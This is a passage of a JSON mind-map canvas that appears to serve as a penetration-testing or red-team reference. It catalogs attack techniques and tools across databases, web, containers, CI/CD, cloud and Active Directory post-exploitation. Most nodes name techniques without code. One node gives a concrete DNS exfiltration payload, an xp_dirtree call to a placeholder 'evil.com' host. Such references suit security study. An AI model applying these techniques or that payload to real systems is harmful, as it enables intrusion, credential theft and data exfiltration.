		{"type":"text","id":"nosql_dbs","text":"NoSQL Databases - NoSQL Injection Variants & Specific Abuses","x":3780,"y":460,"width":600,"height":40},
		{"type":"text","id":"data_security","text":"Data Security - Attacker's Bypasses & Weakness Exploitation","x":3750,"y":840,"width":600,"height":40},
		{"type":"text","id":"encryption_at_rest","text":"Encryption at Rest (TDE, application-level) - Key Management Weaknesses (hardcoded keys, weak KMS policies, insecure key storage/APIs), Brute Forcing Weak Keys, Side-Channel attacks against crypto operations, IV reuse.","x":3780,"y":890,"width":1050,"height":40},
		{"type":"text","id":"encryption_in_transit","text":"Encryption in Transit (SSL/TLS) - Weak Ciphers, Old TLS Versions (POODLE, DROWN), Missing HSTS, Certificate Spoofing (if client trust is weak), TLS Downgrade attacks, BEAST/CRIME/BREACH (if conditions met).","x":3780,"y":940,"width":1050,"height":40},
		{"type":"text","id":"access_controls_data","text":"Access Controls (Least Privilege) - Privilege Escalation via stored procedures/UDFs, Data Tampering, Row-level/Column-level security bypass, Default credentials on DB instances.","x":3780,"y":990,"width":950,"height":40},
		{"type":"text","id":"backup_recovery","text":"Backup & Recovery - Sensitive Data in Backups (unencrypted, exposed), Insecure Backup Storage (public S3, FTP), Unauthenticated Restore leading to data overwrite/injection.","x":3780,"y":1040,"width":900,"height":40},
		{"type":"text","id":"data_masking","text":"Data Masking/Tokenization - Reversible Masking Bypass, Weak Masking Logic (predictable patterns), Token Prediction/Brute Force, Access to unmasked data in non-prod environments.","x":3780,"y":1090,"width":950,"height":40},
		{"type":"text","id":"database_specific_rce","text":"Database-Specific RCE (e.g., Java/C# CLR stored procedures in SQL Server, custom C UDFs in PostgreSQL, Oracle Java VM) - Full system compromise via DB. Often requires high privileges.","x":3780,"y":1190,"width":1050,"height":40},
		{"type":"text","id":"data_exfiltration_channels_db","text":"Data Exfiltration Channels from DB - DNS exfil via DB functions (e.g. `master..xp_dirtree '\\\\data.evil.com\\foo'`), HTTP OOB (`UTL_HTTP.REQUEST`), ICMP (if outbound allowed), SQLi to write to file in webroot.","x":3780,"y":1240,"width":1100,"height":40},
		{"type":"text","id":"template_injection","text":"Server-Side Template Injection (SSTI) - Template Engines (Jinja2, Twig, Velocity, Freemarker, Pebble), Sandbox Bypass (common bypasses for Python, Java, JS template engines), RCE. Tools: Tplmap.","x":1480,"y":2760,"width":1050,"height":40},
		{"type":"text","id":"host_header_injection","text":"Host Header Injection - Password Reset Poisoning, Cache Poisoning (if Host header is part of cache key), SSRF via internal resolution (if Host header used to construct internal URLs), Virtual host bypass.","x":1480,"y":2810,"width":1050,"height":40},
		{"type":"text","id":"mysql_pg_sqlserver","text":"MySQL, PostgreSQL, Oracle, SQL Server - Specific SQLi Syntax, OOB Techniques (DNS, HTTP via UTL_HTTP/xp_dirtree/LOAD_FILE), Stored Procedures for RCE (xp_cmdshell, Java/CLR UDFs), LOAD_FILE/LOAD DATA INFILE, UNC Paths, XXE via DB features (Oracle XML).","x":3810,"y":250,"width":1050,"height":40},
		{"type":"text","id":"acid_properties","text":"ACID Properties - Transaction Abuses, Race Conditions (if not handled at app or DB level, e.g., double-spend).","x":3810,"y":300,"width":750,"height":40},
		{"type":"text","id":"sqli","text":"SQL Injection (SQLi) - Union-based, Error-based, Blind (Boolean, Time), Second Order SQLi, Stacked Queries, Out-of-band Exfil (DNS, HTTP, SMB). Tools: sqlmap (tamper scripts for WAF bypass), Ghauri. Database Takeover (privesc via DB functions).","x":3810,"y":350,"width":1100,"height":40},
		{"type":"text","id":"orm","text":"ORM (Hibernate, SQLAlchemy, Eloquent) - ORM Injection (HQL, JPQL), Query Bypass, Logical Flaws in ORM Mappings, Exploiting deferred execution side effects, Mass assignment via ORM.","x":3810,"y":400,"width":950,"height":40},
		{"type":"text","id":"document_db","text":"Document (MongoDB, Couchbase) - Operator Injection ($ne, $regex, $where, $lookup), JavaScript Injection (eval, mapReduce, $where if not sandboxed), Secondary Context Injection, NoSQLi bypass via BSON/JSON manipulation.","x":3810,"y":510,"width":1050,"height":40},
		{"type":"text","id":"key_value_db","text":"Key-Value (Redis, DynamoDB, Memcached) - Insecure Commands (FLUSHALL, CONFIG SET), Arbitrary Key Write/Read, SSRF via Redis/Memcached protocol (CRLF injection), Lua Sandbox Escape (Redis EVAL), Deserialization via stored data.","x":3810,"y":560,"width":1100,"height":40},
		{"type":"text","id":"column_family_db","text":"Column-Family (Cassandra, HBase) - CQL Injection, Insecure Configuration (JMX exposure), Batch statement abuse.","x":3810,"y":610,"width":800,"height":40},
		{"type":"text","id":"graph_db","text":"Graph (Neo4j, JanusGraph) - Cypher Injection, APOC procedure abuse (file access, RCE), Graph Traversal Abuse for data discovery, Access Control Bypass via complex traversals.","x":3810,"y":660,"width":950,"height":40},
		{"type":"text","id":"race_conditions_backend","text":"Race Conditions (TOCTOU) - Exploiting concurrency for privilege escalation, data corruption, or bypasses (e.g., redeeming coupon codes multiple times, concurrent account modifications, file upload/delete races).","x":1480,"y":2860,"width":1050,"height":40},
		{"type":"text","id":"http_desync_smuggling_backend","text":"HTTP Request Smuggling/Desync (CL.TE, TE.CL, TE.TE) - Cache poisoning, session hijacking, WAF bypass, internal SSRF by desyncing frontend and backend servers. Tools: Turbo Intruder, HTTP Request Smuggler extension.","x":1480,"y":2910,"width":1100,"height":40},
		{"type":"text","id":"databases","text":"Databases - Direct Attack, Abuses, and Data Hoarding","x":3750,"y":150,"width":550,"height":40},
		{"type":"text","id":"data_caching_db","text":"Data Caching (DB Query Caches) - Cache Poisoning (manipulating DB results that get cached), Stale Data issues leading to logic flaws, Side Channel Attacks (timing on cache hits/misses).","x":3750,"y":720,"width":900,"height":40},
		{"type":"text","id":"object_storage","text":"Object Storage (S3, Azure Blob, GCS) - Insecure Permissions (public buckets, ACLs, bucket policies), SSRF to internal endpoints via signed URLs/lifecycle rules, Object Enumeration, Metadata Poisoning, Presigned URL exploitation, Versioning abuse (accessing old sensitive data).","x":3750,"y":780,"width":1150,"height":40},
		{"type":"text","id":"containerization","text":"Containerization - Container Escapes, Supply Chain Attacks & Orchestration Mayhem","x":150,"y":2870,"width":750,"height":40},
		{"type":"text","id":"browser_client","text":"Browser (Client) - Initial Payload Delivery (e.g. XSS reflected), JS Execution for DOM manipulation, Storage Access (cookies, localStorage for session tokens), Service Worker registration for persistence/MITM.","x":3780,"y":2100,"width":1000,"height":40},
		{"type":"text","id":"dns_lookup_flow","text":"DNS Lookup - Potential for DNS Rebinding (targeting internal services), Subdomain Takeover (if CNAME points to de-registered service), Hijacking via malicious local DNS resolver.","x":3780,"y":2150,"width":950,"height":40},
		{"type":"text","id":"post_exploitation_lateral","text":"Post-Exploitation / Lateral Movement (From App Server) - Internal Network Scan (nmap, masscan via proxychains/socks), OS Credential Dumping (Mimikatz, LaZagne, /etc/shadow), Pivoting (SSH, RDP, WinRM), Establishing Persistence (cron, services, backdoors), Exfiltrating Data (DNS, ICMP, HTTPS covert channels), Cloud Lateral Movement (assume IAM roles, access other services, snapshot disks).","x":3780,"y":2600,"width":1200,"height":40},
		{"type":"text","id":"networking","text":"Networking - Perimeter Breaching & Internal Dominance","x":150,"y":2460,"width":600,"height":40},
		{"type":"text","id":"dns","text":"DNS - Zone Transfer (AXFR), DNS Rebinding (for SSRF bypass, internal port scanning), Subdomain Takeover (dangling CNAME/NS records), DNS Poisoning (local & recursive resolver), Wildcard DNS Misuse, Exploiting internal DNS for service discovery.","x":180,"y":2510,"width":1100,"height":40},
		{"type":"text","id":"cdn","text":"CDN (Cloudflare, Akamai, CloudFront, Fastly) - CDN Misconfiguration (origin IP disclosure, cache poisoning), WAF bypass (identifying true origin, CDN-specific bypasses), DDoS bypass (direct origin attack), Abusing edge compute (Lambda@Edge, CF Workers).","x":180,"y":2560,"width":1100,"height":40},
		{"type":"text","id":"firewalls","text":"Firewalls (Network, Host-based, NGFW) - Firewall Bypass (Port Scanning evasion, Protocol Tunneling - ICMP/DNS, NAT Pinning), Policy Misconfiguration (any/any rules), State Table Exhaustion, Application layer filtering bypass.","x":180,"y":2660,"width":1050,"height":40},
		{"type":"text","id":"waf","text":"WAF (Web Application Firewall) - Bypass Techniques (Obfuscation, Null Bytes, HTTP Parameter Pollution/Fragmentation, Encoding - double/UTF7, Boundary Conditions, Logic Bypasses, Unicode normalization, ML WAF adversarial attacks). Identify WAF (wafw00f) then use specific bypasses.","x":180,"y":2710,"width":1200,"height":40},
		{"type":"text","id":"reverse_proxies_infra","text":"Reverse Proxies (SSL Termination, Routing) - Request Smuggling, Path Traversal (via URL encoding/normalization differences), Header Spoofing (internal headers like X-Internal-Service), Authentication Bypass if proxy handles auth incorrectly, Cache poisoning.","x":180,"y":2760,"width":1150,"height":40},
		{"type":"text","id":"vpn_vpc","text":"VPN / VPC / Security Groups / NACLs - Insecure VPN config (weak ciphers, default creds), VPC Peering Exploitation, Overly Permissive Security Group/NACL Rules (e.g. 0.0.0.0/0), Network ACL Bypass via allowed protocols/ports, Split tunneling abuse.","x":180,"y":2810,"width":1100,"height":40},
		{"type":"text","id":"docker","text":"Docker - Daemon Socket Exploitation (mounted Docker socket `/var/run/docker.sock`), Capability Abuse (`CAP_SYS_ADMIN`, `--privileged`), Insecure Image Build (ADD/COPY vulns, unnecessary packages, hardcoded secrets), Leaked Docker API (2375/2376), Exploiting `--security-opt seccomp=unconfined` or `--cap-add=SYS_PTRACE`.","x":180,"y":2920,"width":1200,"height":40},
		{"type":"text","id":"container_registries","text":"Container Registries (Docker Hub, ECR, GCR) - Public Images with Secrets/Vulnerabilities, Anonymous Pull, Image Tampering (if registry compromised), Vulnerable Base Images, Clair/Trivy for scanning.","x":180,"y":2970,"width":1050,"height":40},
		{"type":"text","id":"orchestration","text":"Orchestration - Cluster Compromise, Lateral Movement & Full Takeover","x":180,"y":3020,"width":700,"height":40},
		{"type":"text","id":"jamstack","text":"JAMstack - API Misconfigurations (overly permissive CORS, unauth endpoints), Third-Party Service Dependencies (leaky forms, analytics script XSS).","x":210,"y":610,"width":700,"height":40},
		{"type":"text","id":"bundlers_transpilers","text":"Bundlers (Webpack, Vite) & Transpilers (Babel) - Source Map Leakage (revealing original code, paths), Dependency Confusion, Malicious Plugins, Exploiting sourcemap URIs for internal path disclosure or SSRF.","x":180,"y":660,"width":850,"height":40},
		{"type":"text","id":"package_managers","text":"Package Managers (npm, Yarn) - Dependency Confusion, Typosquatting, Malicious Packages (pre/post-install scripts, StarJacking), Lockfile Tampering, Exploiting outdated vulnerable dependencies.","x":180,"y":710,"width":850,"height":40},
		{"type":"text","id":"styling_preprocessors","text":"Styling/Pre-processors (Sass, Less) - CSS Injection (data exfil, UI redressing), SSRF (if processed server-side with URL imports).","x":150,"y":770,"width":700,"height":40},
		{"type":"text","id":"load_balancers","text":"Load Balancers (Layer 4/7, Health Checks) - Header Spoofing (X-Forwarded-For, True-Client-IP), Request Smuggling/Desync, Health Check Bypass/Abuse (SSRF if internal & exploitable), IP Whitelist Bypass, Session persistence abuse.","x":180,"y":2610,"width":1100,"height":40},
		{"type":"text","id":"automation_servers","text":"Automation Servers (Jenkins, GitHub Actions, GitLab CI, TeamCity) - Unauthenticated API Access, Script Execution (Groovy console RCE in Jenkins), Plugin Exploitation, Agent Compromise (RCE on build nodes), Supply Chain Injection (modifying build process to inject backdoors).","x":180,"y":3490,"width":1200,"height":40},
		{"type":"text","id":"security_infra","text":"Security Infrastructure - Defenses to Bypass & Turn Against Them","x":150,"y":3720,"width":700,"height":40},
		{"type":"text","id":"ddos_mitigation_infra","text":"DDoS Mitigation - Rate Limiting Bypass (IP rotation, header spoofing), Resource Exhaustion (slowloris, low-bandwidth attacks), Application-layer DoS (GraphQL batching, regex DoS, zip bombs), Reflection/Amplification attacks if infra misconfigured.","x":180,"y":3770,"width":1150,"height":40},
		{"type":"text","id":"vuln_scanners_infra","text":"Vulnerability Scanners (Burp, ZAP, Nessus, Qualys) - Scan Policy Bypass (evading detection), False Negatives from poor config, Credential Reuse (if scans use shared, high-priv creds), Exploiting the scanner's own vulns if exposed.","x":180,"y":3820,"width":1150,"height":40},
		{"type":"text","id":"pen_testing_infra","text":"Penetration Testing (Manual, Automated) - Scope Limitations abuse (pivot out of scope), Incomplete Coverage exploitation, Remediation Bypass (patching symptom, not root cause), Exploiting assumptions from previous tests.","x":180,"y":3870,"width":1100,"height":40},
		{"type":"text","id":"kubernetes","text":"Kubernetes (Pods, Deployments, Services) - API Server Misconfig (anonymous access, insecure ports), RBAC bypass/privesc, Pod Escape (hostPath mounts, privileged pods, vulnerable runtime), Privilege Escalation via serviceAccount tokens, Network Policy Bypass, Secret Exposure (etcd, in-pod env vars), Attacking etcd directly, Helm chart misconfigs. Tools: kubeletctl, kube-hunter, CDK, Peirates.","x":210,"y":3070,"width":1250,"height":40},
		{"type":"text","id":"docker_swarm_infra","text":"Docker Swarm - Manager Node Compromise (full cluster control), Secret Disclosure, Insecure network configurations.","x":210,"y":3120,"width":800,"height":40},
		{"type":"text","id":"service_mesh","text":"Service Mesh (Istio, Linkerd) - Misconfigured policies (AuthorizationPolicy bypass), mTLS bypass, Control plane compromise, Sidecar injection for traffic interception/manipulation, Exploiting exposed metrics/tracing endpoints.","x":210,"y":3170,"width":1100,"height":40},
		{"type":"text","id":"cicd_pipelines","text":"CI/CD Pipelines - Supply Chain Attack, RCE on Build Agents & Lateral Movement","x":150,"y":3290,"width":700,"height":40},
		{"type":"text","id":"version_control","text":"Version Control (Git: GitHub, GitLab, Bitbucket) - Exposed Credentials/Secrets (Gitleaks, TruffleHog), Sensitive Data in Repos, Branch Protection Bypass, Webhook Compromise (SSRF, RCE), SSH Key Compromise, Insecure Git server configs (anonymous write).","x":180,"y":3340,"width":1100,"height":40},
		{"type":"text","id":"build_tools","text":"Build Tools (Maven, Gradle, Webpack, Jenkinsfile, Dockerfile) - Dependency Confusion, Plugin Vulnerabilities, Arbitrary File Read/Write during build, RCE via build script manipulation, Insecurely configured artifact repositories (Nexus, Artifactory).","x":180,"y":3390,"width":1150,"height":40},
		{"type":"text","id":"testing_frameworks_infra","text":"Testing Frameworks (Unit, Integration, E2E) - Test Data Leakage (sensitive data in test fixtures), Mocking Abuse (bypassing security controls in test), Insecure Test Environment Exposure (debug ports, default creds).","x":180,"y":3440,"width":1050,"height":40},
		{"type":"text","id":"deployment_strategies_infra","text":"Deployment Strategies (Blue/Green, Canary) - Race Conditions during switchover, Backdoor Injection before full rollout, Bypass of staged deployment security checks, Configuration drift between environments.","x":180,"y":3540,"width":1050,"height":40},
		{"type":"text","id":"observability_infra","text":"Observability (Monitoring, Logging, Tracing - Prometheus, Grafana, ELK, Jaeger) - Log Poisoning/Injection, Metrics Tampering, Alert Suppression, Sensitive Data in Traces/Logs, Exploiting vulns in the observability tools themselves (e.g. Grafana SSRF/XSS).","x":150,"y":3600,"width":1200,"height":40},
		{"type":"text","id":"iac_infra","text":"Infrastructure as Code (Terraform, Ansible, CloudFormation, Pulumi) - Exposed Secrets in code/state files, Misconfigurations leading to vulnerable deployments, Remote State Compromise (S3 backend for Terraform), Command injection in Ansible playbooks/Terraform provisioners.","x":150,"y":3660,"width":1200,"height":40},
		{"type":"text","id":"serverless_computing_infra","text":"Serverless Computing (Lambda, Azure Functions, GCF) - Insecure Permissions (over-privileged execution roles), Function Code Injection, Data Exfiltration via outbound connections, Cold Start Attacks (if sensitive data loaded), Exploiting vulnerabilities in function layers/dependencies, Event source trigger manipulation.","x":150,"y":3230,"width":1200,"height":40},
		{"type":"text","id":"lateral_movement_tech","text":"Lateral Movement Techniques - PsExec/Impacket tools (psexec.py, smbexec.py), WinRM (Invoke-Command), SSH (with stolen keys/creds), RDP, SMB Relay (Responder, ntlmrelayx), Pass-the-Hash/Ticket, DCOM, WMI (wmic, Invoke-WmiCommand), Exploiting Trust Relationships (AD forest trusts, service accounts), Pivoting to different network segments.","x":2080,"y":5350,"width":1250,"height":40},
		{"type":"text","id":"pivoting_tunneling_postexploit","text":"Pivoting & Tunneling - ProxyChains (SOCKS over SSH -D), Port Forwarding (chisel, plink, SSH -L/-R), DNS Tunneling (iodine, dnscat2), ICMP Tunneling (ptunnel-ng), HTTP/HTTPS C2 tunneling. Create resilient pathways.","x":2080,"y":5400,"width":1100,"height":40},
		{"type":"text","id":"data_exfiltration_post_exploit","text":"Data Exfiltration - Covert Channels (DNS, ICMP, HTTP headers - e.g. Cookie exfil), Steganography, Encrypted Archives (password protected zips), Cloud Storage (rogue S3 buckets, OneDrive), Direct DB connections from internal network, Rsync/SCP, WebDAV. Prioritize valuable data.","x":2080,"y":5450,"width":1200,"height":40},
		{"type":"text","id":"command_control_c2_postexploit","text":"Command & Control (C2) - Establishing C2 Channels (HTTPS, DNS over HTTPS, Domain Fronting, ICMP), Custom C2 Frameworks (Sliver, Covenant, Havoc, Mythic, Metasploit MSFVenom payloads), Beaconing (configurable intervals, jitter), Evasion (process injection, in-memory execution, malleable C2 profiles).","x":2080,"y":5500,"width":1200,"height":40},
		{"type":"text","id":"cloud_post_exploitation_adv","text":"Cloud Post-Exploitation (Advanced) - Abusing IAM Roles/Policies (assumeRole chaining, trust policy abuse), Accessing Cloud APIs with Stolen Keys/Tokens (e.g. S3 API for data, EC2 API for instance control), Snapshotting Volumes for offline analysis, Backdooring Serverless Functions, Attacking Control Plane (e.g. Kubernetes API, CloudFormation), Cross-account attacks.","x":2080,"y":5550,"width":1250,"height":40},
		{"type":"text","id":"defense_evasion_post_exploit","text":"Defense Evasion - Clearing Logs (OS, App, Security tools), Timestomping, AMSI Bypass (PowerShell), Disabling Security Tools (EDR, AV - often requires privesc), Rootkits, In-memory execution (Reflective DLL Loading, Execute-Assembly), Process Hollowing/Injection, Masquerading (renaming tools, legitimate process names).","x":2080,"y":5600,"width":1250,"height":40},
		{"type":"text","id":"impact_objective_achieved","text":"Impact / Objective Achieved - Data Destruction/Encryption (Ransomware), Crypto Mining, Espionage (long-term data theft), Selling Access (Initial Access Brokers), Reputational Damage, Disruption of Services. Document and report findings clearly.","x":2080,"y":5650,"width":1150,"height":40},
		{"type":"text","id":"domain_dominance_ad","text":"Domain Dominance (Active Directory) - Golden Ticket (full forest compromise), Silver Ticket (service access), Skeleton Key, DCSync, AdminSDHolder abuse, Group Policy modification for widespread malware deployment. Critical target in enterprise environments.","x":2080,"y":5700,"width":1150,"height":40},
		{"type":"text","id":"security_headers_infra","text":"Security Headers (HSTS, XFO, CSP, SRI, CORP/COEP) - Misconfigurations, Bypass techniques (see CSP, Clickjacking), Downgrade attacks if HSTS not preloaded, Weak CSP allowing unsafe-inline/eval.","x":180,"y":3920,"width":1100,"height":40},
		{"type":"text","id":"asset_discovery_infra","text":"Asset Discovery & Management - Shadow IT (unmanaged assets), Unpatched Systems, Default Passwords, Publicly Exposed Services/Ports, Forgotten subdomains/apps. Continuous monitoring is key.","x":180,"y":4120,"width":1050,"height":40},
		{"type":"text","id":"sidechannel_attacks_infra","text":"Side-Channel Attacks (e.g., Spectre, Meltdown, Rowhammer, CPU cache timing) - Info leak from co-hosted VMs/containers. More relevant in multi-tenant IaaS/PaaS. Hard to exploit, high impact.","x":180,"y":4170,"width":1100,"height":40},
		{"type":"text","id":"physical_security_onprem_infra","text":"On-Prem Physical Access (If applicable) - Evil Maid attacks, USB drops (autorun, HID emulation), Network port access (rogue AP, direct connection), Console access to servers/network gear.","x":180,"y":4220,"width":1050,"height":40},
		{"type":"text","id":"cloud_specific_services_misconfig_infra","text":"Cloud-Specific Service Misconfigs (e.g., AWS SQS/SNS, GCP Pub/Sub, Azure Event Grid/Service Bus, Managed DBs) - Unauthorized access, data exfil, message injection, IAM policy flaws specific to these services.","x":180,"y":4270,"width":1150,"height":40},
		{"type":"text","id":"initial_foothold","text":"Initial Foothold (Achieved via App Vuln - RCE, SSRF to Shell, Deserialization, SQLi to OS Shell etc.) - Stabilize shell, get interactive access.","x":2050,"y":5100,"width":900,"height":40},
		{"type":"text","id":"priv_esc_os","text":"Privilege Escalation (OS Level) - Kernel Exploits (Dirty COW/Pipe, recent CVEs), SUID/GUID Abuse, Misconfigured Services (unquoted paths, weak permissions), DLL Hijacking, sudo exploits (check `sudo -l`), GTFOBins/LOLBAS abuse, Cron job hijacking, Token impersonation (Windows). Tools: LinPEAS, WinPEAS, PowerUp, Linux Exploit Suggester.","x":2080,"y":5150,"width":1200,"height":40},
		{"type":"text","id":"persistence_mechanisms","text":"Persistence Mechanisms - Scheduled Tasks/Cron Jobs, Services (custom, hijacked), Run Keys (Windows Registry), Backdoored Binaries/Libraries, Web Shells (obfuscated, hidden), Rootkits (user/kernel), SSH Authorized Keys/Backdoored SSH, Cloud Persistence (backdoor IAM users/roles, Lambda triggers, malicious snapshots).","x":2080,"y":5200,"width":1200,"height":40},
		{"type":"text","id":"internal_recon_postexploit","text":"Internal Reconnaissance - Network Scanning (nmap, rustscan, PingCastle for AD), Host Enumeration, Service Discovery (netstat, lsof), Credential Hunting (browser creds, config files, memory - procdump, gdb), Active Directory enumeration (BloodHound, PowerView), Internal DNS queries.","x":2080,"y":5250,"width":1200,"height":40},
		{"type":"text","id":"credential_access_postexploit","text":"Credential Access - Mimikatz (LSASS dumping, Pass-the-Hash/Ticket), LaZagne, SharpHound/BloodHound (AD creds/sessions), Kerberoasting, AS-REP Roasting, DPAPI abuse, Retrieving secrets from Vault/KMS/Secrets Manager (if compromised host has access), Dumping SAM/NTDS.DIT.","x":2080,"y":5300,"width":1200,"height":40},
		{"type":"text","id":"secrets_management_infra","text":"Secrets Management (Vault, Key Vault, KMS, CyberArk) - Insecure Access Policies (overly permissive), Default Credentials, Compromised Tokens/Client Certs, Privilege Escalation via Secret Access, Exploiting vulns in the secrets manager itself.","x":180,"y":3970,"width":1150,"height":40},
		{"type":"text","id":"rasp_infra","text":"RASP (Runtime Application Self-Protection) - Evasion Techniques (encoding, obscure payloads, logic flaws in RASP rules), Sandbox Escape from RASP instrumentation, Performance impact leading to disabling.","x":180,"y":4020,"width":1050,"height":40},
		{"type":"text","id":"identity_management_infra","text":"Identity & Access Management (AD, Okta, Ping, Auth0, Keycloak) - Federation Attacks (Golden SAML, Dirty SAML), ATO (credential stuffing, phishing), Password Spraying, Kerberoasting/AS-REP Roasting, Insecure IdP config, OAuth consent abuse.","x":180,"y":4070,"width":1150,"height":40}
	],
	"edges":[
		{"id":"8d53c8e3bc5486b1","fromNode":"passive_recon","fromSide":"bottom","toNode":"active_recon_infra","toSide":"top"}
	]
}